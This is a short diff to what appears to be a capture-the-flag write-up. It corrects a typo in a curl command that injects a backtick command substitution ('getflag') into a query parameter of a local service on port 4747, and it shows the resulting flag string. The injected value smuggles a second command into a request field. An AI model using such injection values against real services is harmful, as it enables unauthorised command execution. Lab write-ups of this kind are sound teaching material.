@@ -6,6 +6,6 @@ We see in the source code that  the script contains a subroutine that takes as p
 
 ```bash
 curl localhost:4747?x=lol # lol
-url localhost:4747?x=\`getflag\` # ne2searoevaevoem4ov4ar8ap
+curl localhost:4747?x=\`getflag\` # ne2searoevaevoem4ov4ar8ap
 ```
 
